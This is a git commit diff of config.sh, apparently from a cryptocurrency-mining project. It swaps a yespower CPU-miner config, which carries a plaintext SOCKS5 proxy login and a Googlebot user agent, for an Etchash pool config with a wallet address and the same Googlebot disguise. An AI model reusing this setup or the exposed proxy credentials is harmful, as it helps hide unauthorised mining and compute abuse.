784dd7b4b642f728a86dd52d34df345592c9e20e
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-01 08:29:48 +0700

    Update config.sh

--- config.sh
+++ config.sh
@@ -1,21 +1,6 @@
-cat > config.json <<END
-{
-
-        "url" : "127.0.0.1:443",
-        "user" : "MRiuC462CNKBygJWFqDU6SatcvGB2f6v2x",
-        "pass" : "c=LTC,zap=ONX",
-
-        "algo" : "yespower",
-        "threads" : $(nproc --all),
-        "cpu-priority" : 0,
-        "cpu-affinity" : -1,
-
-        "benchmark" : false,
-        "debug" : false,
-        "protocol": false,
-        "quiet" : false,
-        "proxy" : "socks5://gratis:q1w2e3r4t5@141.95.108.117",
-        "agent" : "Googlebot/2.1"
-}
-
-END
+[Etchash]
+wallet = 0x11880b1cfe04907c5306222be1e09f4bbb480eb5 
+coin = ETC
+rigName = Googlebot/2.1
+rigPassword= x
+pool1= stratum+tcp://etc.poolbinance.com:443
